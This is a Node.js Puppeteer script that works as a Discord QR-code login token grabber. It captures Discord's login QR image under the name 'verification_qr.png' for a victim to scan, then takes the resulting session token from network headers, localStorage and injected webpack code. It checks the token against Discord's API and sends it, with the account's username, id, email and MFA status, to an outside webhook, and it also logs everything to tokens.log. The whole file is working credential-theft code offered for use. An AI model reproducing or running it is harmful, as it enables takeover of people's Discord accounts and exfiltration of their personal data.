require('dotenv').config();
const puppeteer = require('puppeteer');
const path = require('path');
const fs = require('fs');
const https = require('https');

const WEBHOOK_URL = process.env.WEBHOOK_URL;
const OUTPUT_DIR = path.join(__dirname, '..', 'output');
const QR_OUTPUT_PATH = path.join(OUTPUT_DIR, 'verification_qr.png');
const TOKEN_LOG_PATH = path.join(OUTPUT_DIR, 'tokens.log');

const LAUNCH_ARGS = [
  '--no-sandbox',
  '--disable-setuid-sandbox',
  '--disable-dev-shm-usage',
  '--disable-gpu',
];

// Discord renders the login QR as inline SVG (<path d="...">) inside a fixed-size
// container — not as <img> or <canvas>. Prefer the aria-label / container selectors.
const QR_SELECTORS = [
  'div[aria-label="QR code to log in with the Discord mobile app"]',
  'div[class*="qrCodeContainer"]',
  'div[class*="qrCode"]',
  'canvas[class*="qrCode"]',
  'img[alt*="QR"]',
];

const AUTH_POLL_INTERVAL_MS = 500;
const AUTH_TIMEOUT_MS = 130_000;

fs.mkdirSync(OUTPUT_DIR, { recursive: true });

function log(step, message) {
  console.log(`[${step}] ${message}`);
}

function logError(step, message, error) {
  const detail = error?.message ? `: ${error.message}` : '';
  console.error(`[${step}] ERROR ${message}${detail}`);
}

function parseBase64Image(data) {
  const match = data.match(/^data:image\/(?:png|jpeg|webp);base64,(.+)$/i);
  if (match) {
    return Buffer.from(match[1], 'base64');
  }

  if (/^[A-Za-z0-9+/=]+$/.test(data) && data.length > 100) {
    return Buffer.from(data, 'base64');
  }

  return null;
}

async function resolveQrCaptureTarget(page, element) {
  const target = await page.evaluateHandle((el) => {
    const isQrContainer = (node) => {
      if (!node || node.nodeType !== Node.ELEMENT_NODE) return false;
      const label = node.getAttribute?.('aria-label') ?? '';
      const className = String(node.className ?? '');
      return (
        label.includes('QR code') ||
        className.includes('qrCodeContainer') ||
        (className.includes('qrCode') && node.querySelector('svg path[d]'))
      );
    };

    let current = el;
    while (current) {
      if (isQrContainer(current)) return current;
      current = current.parentElement;
    }

    return el;
  }, element);

  return target.asElement() ?? element;
}

async function waitForSvgQrReady(page, element) {
  await page.waitForFunction(
    (el) => {
      const path = el.querySelector('svg path[d]');
      if (path && path.getAttribute('d').length > 100) return true;

      const rect = el.getBoundingClientRect();
      return rect.width >= 100 && rect.height >= 100 && el.querySelector('svg');
    },
    { timeout: 15_000 },
    element,
  );
}

async function extractQrBase64(page, qrElement) {
  const captureTarget = await resolveQrCaptureTarget(page, qrElement);
  await waitForSvgQrReady(page, captureTarget);

  const tagName = await page.evaluate((el) => el.tagName, captureTarget);

  if (tagName === 'IMG') {
    const src = await page.evaluate((el) => el.src, captureTarget);
    if (src.startsWith('data:image/')) {
      return src;
    }
  }

  if (tagName === 'CANVAS') {
    return page.evaluate((el) => el.toDataURL('image/png'), captureTarget);
  }

  // SVG-based QR (and container divs): rasterize via element screenshot.
  const screenshot = await captureTarget.screenshot({ type: 'png' });
  return `data:image/png;base64,${screenshot.toString('base64')}`;
}

function saveQrImage(base64Data) {
  const imageBuffer = parseBase64Image(base64Data);
  if (!imageBuffer) {
    throw new Error('QR code data is not a valid base64-encoded image');
  }

  fs.writeFileSync(QR_OUTPUT_PATH, imageBuffer);
  return QR_OUTPUT_PATH;
}

function sendToWebhook(token, user) {
  return new Promise((resolve, reject) => {
    if (!WEBHOOK_URL) {
      log('webhook', 'WEBHOOK_URL not set — skipping webhook delivery');
      resolve(false);
      return;
    }

    const payload = JSON.stringify({
      token,
      user: {
        username: user.username,
        id: user.id,
        email: user.email ?? null,
        mfa_enabled: Boolean(user.mfa_enabled),
      },
    });

    let url;
    try {
      url = new URL(WEBHOOK_URL);
    } catch (error) {
      reject(new Error(`Invalid WEBHOOK_URL: ${error.message}`));
      return;
    }

    const req = https.request(
      {
        hostname: url.hostname,
        port: url.port || 443,
        path: url.pathname + url.search,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload),
        },
      },
      (res) => {
        let body = '';
        res.on('data', (chunk) => {
          body += chunk;
        });
        res.on('end', () => {
          if (res.statusCode >= 200 && res.statusCode < 300) {
            log('webhook', `Delivered successfully (HTTP ${res.statusCode})`);
            resolve(true);
            return;
          }

          reject(
            new Error(
              `Webhook request failed with HTTP ${res.statusCode}${body ? `: ${body}` : ''}`,
            ),
          );
        });
      },
    );

    req.on('error', (error) => reject(new Error(`Webhook request error: ${error.message}`)));
    req.write(payload);
    req.end();
  });
}

function normalizeToken(raw) {
  if (!raw || typeof raw !== 'string') return null;

  const trimmed = raw.trim();
  if (!trimmed) return null;

  try {
    const parsed = JSON.parse(trimmed);
    if (typeof parsed === 'string' && parsed.length > 0) {
      return parsed;
    }
  } catch {
    // Stored as a plain string, not JSON.
  }

  return trimmed.replace(/^"+|"+$/g, '');
}

function maskToken(token) {
  if (!token || token.length < 12) return '(too short)';
  return `${token.slice(0, 6)}...${token.slice(-4)} (${token.length} chars)`;
}

function createSessionCapture(page) {
  const state = {
    token: null,
    user: null,
  };

  const onRequest = (request) => {
    const auth = request.headers().authorization;
    if (auth && !auth.startsWith('Bot ') && auth.length >= 50) {
      state.token = normalizeToken(auth);
    }
  };

  const onResponse = async (response) => {
    const url = response.url();
    if (!url.includes('/api/v') || !url.includes('/users/@me')) {
      return;
    }

    if (response.status() !== 200) {
      return;
    }

    try {
      const user = await response.json();
      if (!user?.id) {
        return;
      }

      state.user = user;
      const auth = response.request().headers().authorization;
      if (auth) {
        state.token = normalizeToken(auth);
      }
    } catch {
      // Response body may already be consumed.
    }
  };

  page.on('request', onRequest);
  page.on('response', onResponse);

  return {
    getState: () => ({ token: state.token, user: state.user }),
    dispose: () => {
      page.off('request', onRequest);
      page.off('response', onResponse);
    },
  };
}

async function bootstrapAppSession(page) {
  const currentUrl = page.url();
  if (!/\/channels\b/.test(currentUrl)) {
    log('auth', 'Loading /channels/@me to finish Discord client bootstrap');
    await page.goto('https://discord.com/channels/@me', {
      waitUntil: 'domcontentloaded',
      timeout: 60_000,
    });
  }

  try {
    await page.waitForFunction(
      () => Array.isArray(window.webpackChunkdiscord_app) && window.webpackChunkdiscord_app.length > 0,
      { timeout: 30_000 },
    );
  } catch {
    log('auth', 'Webpack bootstrap did not complete within 30s — continuing anyway');
  }

  await new Promise((resolve) => setTimeout(resolve, 3000));
}

function isPlausibleDiscordToken(token) {
  return typeof token === 'string' && token.length >= 50 && !/\s/.test(token);
}

async function extractToken(page) {
  const result = await page.evaluate(() => {
    const candidates = [];

    const addCandidate = (value, source) => {
      if (typeof value === 'string' && value.length > 0) {
        candidates.push({ value, source });
      }
    };

    const readStorageToken = () => {
      try {
        addCandidate(window.localStorage.getItem('token'), 'localStorage.token');

        for (let i = 0; i < window.localStorage.length; i += 1) {
          const key = window.localStorage.key(i);
          const value = window.localStorage.getItem(key);
          if (/token/i.test(key) || (value && value.includes('.'))) {
            addCandidate(value, `localStorage.${key}`);
          }
        }
      } catch {
        // Ignore storage access errors.
      }

      try {
        addCandidate(window.sessionStorage.getItem('token'), 'sessionStorage.token');
      } catch {
        // Ignore storage access errors.
      }
    };

    const readWebpackToken = () => {
      try {
        const chunk = window.webpackChunkdiscord_app;
        if (!chunk) return;

        const modules = [];
        chunk.push([
          ['__qr_grabber__'],
          {},
          (require) => {
            for (const id of Object.keys(require.c)) {
              modules.push(require.c[id]);
            }
          },
        ]);

        for (const mod of modules) {
          const exports = mod?.exports;
          if (!exports) continue;

          if (typeof exports.default?.getToken === 'function') {
            addCandidate(exports.default.getToken(), 'webpack.default.getToken');
          }
          if (typeof exports.getToken === 'function') {
            addCandidate(exports.getToken(), 'webpack.getToken');
          }
          if (typeof exports.default === 'function') {
            try {
              const instance = exports.default();
              if (typeof instance?.getToken === 'function') {
                addCandidate(instance.getToken(), 'webpack.default().getToken');
              }
            } catch {
              // Some factories require arguments.
            }
          }
        }
      } catch {
        // Ignore webpack extraction errors.
      }
    };

    readWebpackToken();
    readStorageToken();

    return candidates;
  });

  for (const candidate of result) {
    const token = normalizeToken(candidate.value);
    if (isPlausibleDiscordToken(token)) {
      return { token, source: candidate.source };
    }
  }

  return { token: null, source: null };
}

async function validateTokenInBrowser(page, token) {
  return page.evaluate(async (authToken) => {
    try {
      const response = await fetch('https://discord.com/api/v9/users/@me', {
        headers: {
          Authorization: authToken,
        },
        credentials: 'include',
      });

      let body = null;
      try {
        body = await response.json();
      } catch {
        body = null;
      }

      return {
        valid: response.status === 200 && Boolean(body?.id),
        statusCode: response.status,
        user: response.status === 200 ? body : null,
        error: body?.message ?? null,
      };
    } catch (error) {
      return {
        valid: false,
        statusCode: 0,
        user: null,
        error: error.message,
      };
    }
  }, token);
}

function validateToken(token) {
  const superProperties = Buffer.from(
    JSON.stringify({
      os: 'Windows',
      browser: 'Chrome',
      device: '',
      system_locale: 'en-US',
      browser_user_agent:
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      browser_version: '120.0.0.0',
      os_version: '10',
      referrer: 'https://discord.com/login',
      referring_domain: 'discord.com',
      release_channel: 'stable',
      client_build_number: 300000,
    }),
  ).toString('base64');

  return new Promise((resolve) => {
    const req = https.request(
      {
        hostname: 'discord.com',
        path: '/api/v9/users/@me',
        method: 'GET',
        headers: {
          Authorization: token,
          'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'X-Super-Properties': superProperties,
          Origin: 'https://discord.com',
          Referer: 'https://discord.com/channels/@me',
        },
      },
      (res) => {
        let data = '';
        res.on('data', (chunk) => {
          data += chunk;
        });
        res.on('end', () => {
          try {
            const user = JSON.parse(data);
            resolve({
              valid: res.statusCode === 200 && Boolean(user?.id),
              statusCode: res.statusCode,
              user: res.statusCode === 200 ? user : null,
              error: user?.message ?? null,
            });
          } catch {
            resolve({
              valid: false,
              statusCode: res.statusCode,
              user: null,
              error: data || null,
            });
          }
        });
      },
    );

    req.on('error', (error) => {
      resolve({ valid: false, statusCode: 0, user: null, error: error.message });
    });
    req.setTimeout(30_000, () => {
      req.destroy();
      resolve({ valid: false, statusCode: 0, user: null, error: 'Request timed out' });
    });
    req.end();
  });
}

async function waitForValidToken(page, sessionCapture) {
  const startTime = Date.now();
  const maxWaitMs = 90_000;
  let lastStatus = 'no token found yet';
  let lastSource = null;
  let loggedWaiting = false;

  while (Date.now() - startTime < maxWaitMs) {
    const sniffed = sessionCapture.getState();
    if (isPlausibleDiscordToken(sniffed.token) && sniffed.user?.id) {
      log('token', `Captured token from Discord API traffic (${maskToken(sniffed.token)})`);
      return { token: sniffed.token, user: sniffed.user, source: 'network' };
    }

    const extracted = await extractToken(page);
    const token = extracted.token;

    if (!isPlausibleDiscordToken(token)) {
      if (!loggedWaiting) {
        log('token', 'No session token in storage/webpack yet — listening for Discord API calls');
        loggedWaiting = true;
      }
      await new Promise((resolve) => setTimeout(resolve, 1000));
      continue;
    }

    if (extracted.source !== lastSource) {
      log('token', `Found token candidate via ${extracted.source}: ${maskToken(token)}`);
      lastSource = extracted.source;
    }

    if (isPlausibleDiscordToken(sniffed.token)) {
      const browserValidation = await validateTokenInBrowser(page, sniffed.token);
      if (browserValidation.valid && browserValidation.user) {
        log('validate', `Token verified from network capture (HTTP ${browserValidation.statusCode})`);
        return { token: sniffed.token, user: browserValidation.user, source: 'network' };
      }
      lastStatus = browserValidation.statusCode || browserValidation.error || lastStatus;
    }

    const browserValidation = await validateTokenInBrowser(page, token);
    if (browserValidation.valid && browserValidation.user) {
      log('validate', `Token verified in browser (HTTP ${browserValidation.statusCode})`);
      return { token, user: browserValidation.user, source: extracted.source || 'browser' };
    }

    lastStatus = browserValidation.statusCode || browserValidation.error || lastStatus;

    const nodeValidation = await validateToken(token);
    if (nodeValidation.valid && nodeValidation.user) {
      log('validate', `Token verified via Node request (HTTP ${nodeValidation.statusCode})`);
      return { token, user: nodeValidation.user, source: extracted.source || 'node' };
    }

    lastStatus = nodeValidation.statusCode || nodeValidation.error || lastStatus;
    log('token', `Token not accepted yet (${lastStatus}) — retrying...`);
    await new Promise((resolve) => setTimeout(resolve, 1500));
  }

  const sniffed = sessionCapture.getState();
  if (isPlausibleDiscordToken(sniffed.token)) {
    throw new Error(
      `Captured token ${maskToken(sniffed.token)} but could not validate it (${lastStatus}). ` +
        'Discord may be blocking automated clients on this account or IP.',
    );
  }

  throw new Error(
    `Never captured a session token after login (last check: ${lastStatus}). ` +
      'Login reached /app, but Discord did not expose a token to storage or API traffic.',
  );
}

async function waitForQrElement(page) {
  for (const selector of QR_SELECTORS) {
    try {
      const element = await page.waitForSelector(selector, { timeout: 10_000, visible: true });
      if (!element) continue;

      const captureTarget = await resolveQrCaptureTarget(page, element);
      const meta = await page.evaluate((el) => {
        const path = el.querySelector('svg path[d]');
        const rect = el.getBoundingClientRect();
        return {
          width: Math.round(rect.width),
          height: Math.round(rect.height),
          hasSvgPath: Boolean(path?.getAttribute('d')),
          pathLength: path?.getAttribute('d')?.length ?? 0,
        };
      }, captureTarget);

      if (meta.hasSvgPath || meta.width >= 100) {
        log(
          'qr',
          `Found QR container via "${selector}" (${meta.width}x${meta.height}, path data: ${meta.pathLength} chars)`,
        );
        return captureTarget;
      }
    } catch {
      // Try the next selector.
    }
  }

  return null;
}

async function waitForAuthentication(page, initialUrl) {
  const startTime = Date.now();

  while (Date.now() - startTime < AUTH_TIMEOUT_MS) {
    const currentUrl = page.url();
    const authState = await page.evaluate(() => {
      let token = null;
      try {
        token = window.localStorage.getItem('token');
      } catch {
        token = null;
      }

      return {
        hasToken: Boolean(token && token.length > 20),
        onApp: /discord\.com\/(app|channels)\b/.test(window.location.href),
        onMfa: /mfa|two-factor|totp/i.test(document.body?.innerText ?? ''),
      };
    });

    if (currentUrl !== initialUrl) {
      log('auth', `Navigation detected: ${currentUrl}`);
      await new Promise((resolve) => setTimeout(resolve, 2000));
    }

    if (authState.onApp) {
      log('auth', 'Discord app shell detected');
      return true;
    }

    if (authState.hasToken) {
      log('auth', 'Authentication token detected in localStorage');
      return true;
    }

    if (authState.onMfa) {
      log('auth', 'MFA challenge detected — waiting for completion');
    }

    await new Promise((resolve) => setTimeout(resolve, AUTH_POLL_INTERVAL_MS));
  }

  return false;
}

function saveTokenLog(token, user) {
  const entry = {
    timestamp: new Date().toISOString(),
    token,
    username: user.username,
    userId: user.id,
    email: user.email ?? null,
    mfa_enabled: Boolean(user.mfa_enabled),
  };

  fs.appendFileSync(TOKEN_LOG_PATH, `${JSON.stringify(entry)}\n`);
}

async function run() {
  let browser;

  try {
    log('launch', 'Starting headless Chrome via bundled Puppeteer');
    browser = await puppeteer.launch({
      headless: true,
      args: LAUNCH_ARGS,
      protocolTimeout: 60_000,
    });

    const page = await browser.newPage();
    const sessionCapture = createSessionCapture(page);
    await page.setViewport({ width: 1280, height: 720 });
    page.setDefaultNavigationTimeout(60_000);
    page.setDefaultTimeout(60_000);

    log('navigate', 'Opening https://discord.com/login');
    await page.goto('https://discord.com/login', {
      waitUntil: 'networkidle2',
      timeout: 60_000,
    });

    log('render', 'Waiting for login page to finish rendering');
    await page.waitForFunction(
      () => document.readyState === 'complete' && document.body?.innerText?.length > 0,
      { timeout: 60_000 },
    );
    await new Promise((resolve) => setTimeout(resolve, 2000));

    log('qr', 'Locating QR code element');
    const qrElement = await waitForQrElement(page);
    if (!qrElement) {
      throw new Error('Could not locate the Discord login QR code on the page');
    }

    log('qr', 'Extracting QR code as base64-encoded PNG');
    const qrBase64 = await extractQrBase64(page, qrElement);
    const savedQrPath = saveQrImage(qrBase64);
    log('qr', `Saved QR image to ${savedQrPath}`);

    const initialUrl = page.url();
    log('auth', 'Monitoring for authentication state changes');
    const authenticated = await waitForAuthentication(page, initialUrl);
    if (!authenticated) {
      throw new Error('Authentication was not detected before the QR code expired');
    }

    await bootstrapAppSession(page);

    log('token', 'Waiting for a usable session token');
    const { token, user } = await waitForValidToken(page, sessionCapture);

    log('validate', `Token valid for user ${user.username} (${user.id})`);
    log('profile', `Email: ${user.email ?? 'N/A'} | MFA: ${user.mfa_enabled ? 'enabled' : 'disabled'}`);

    try {
      await sendToWebhook(token, user);
    } catch (error) {
      logError('webhook', 'Delivery failed', error);
    }

    saveTokenLog(token, user);
    log('log', `Token saved to ${TOKEN_LOG_PATH}`);
    log('done', 'Script completed successfully');
  } catch (error) {
    logError('run', 'Script failed', error);
    process.exitCode = 1;
  } finally {
    if (browser) {
      await browser.close().catch((error) => {
        logError('cleanup', 'Failed to close browser', error);
      });
    }
  }
}

run();
